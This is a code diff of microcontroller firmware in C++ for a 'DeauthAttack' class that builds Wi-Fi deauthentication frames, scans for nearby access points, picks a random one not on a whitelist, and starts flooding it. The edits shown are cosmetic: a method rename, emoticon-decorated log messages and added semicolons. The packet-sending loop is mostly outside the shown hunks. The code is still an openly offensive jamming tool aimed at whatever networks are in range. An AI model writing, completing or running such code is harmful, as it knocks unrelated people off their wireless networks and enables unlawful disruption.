@@ -19,9 +19,9 @@ uint8_t deauthPacket[26] = {
     /* 24 - 25 */ 0x01, 0x00                          // reason code (1 = unspecified reason)
     };
 
-void DeauthAttack::addWhitelist(const char* bssid) {
+void DeauthAttack::addToWhitelist(const char* bssid) {
     whitelist.push_back(bssid);
-}
+};
 
 void DeauthAttack::selectAP() {
     int apCount = WiFi.scanNetworks();
@@ -32,30 +32,30 @@ void DeauthAttack::selectAP() {
 
         // check for ap in whitelist
         if (std::find(whitelist.begin(), whitelist.end(), randomAP) != whitelist.end()) {
-            Serial.println("Selected AP is in the whitelist. Skipping deauthentication.");
+            Serial.println("('-') Selected AP is in the whitelist. Skipping deauthentication...");
             return;
         }
 
-        Serial.print("Selected random AP: ");
+        Serial.print("('-') Selected random AP: ");
         Serial.println(randomAP);
     } else {
-        Serial.println("No access points found.");
+        Serial.println("(;-;) No access points found.");
     }
-}
+};
 
 void DeauthAttack::startDeauth() {
     if (randomAP.length() > 0) {
-        Serial.println("Starting deauthentication attack on the selected AP...");
+        Serial.println("(>-<) Starting deauthentication attack on the selected AP...");
         // define the attack
         if (!running) {
             start();
         } else {
-            Serial.println("Attack is already running.");
+            Serial.println("('-') Attack is already running.");
         }
     } else {
-        Serial.println("No access point selected. Use selectRandomAP() first.");
+        Serial.println("(X-X) No access point selected. Use selectRandomAP() first.");
     }
-}
+};
 
 void DeauthAttack::start() {
     running = true;
@@ -69,4 +69,4 @@ void DeauthAttack::start() {
     }
     Serial.println("(^-^) Attack finished!");
     running = false;
-}
+};
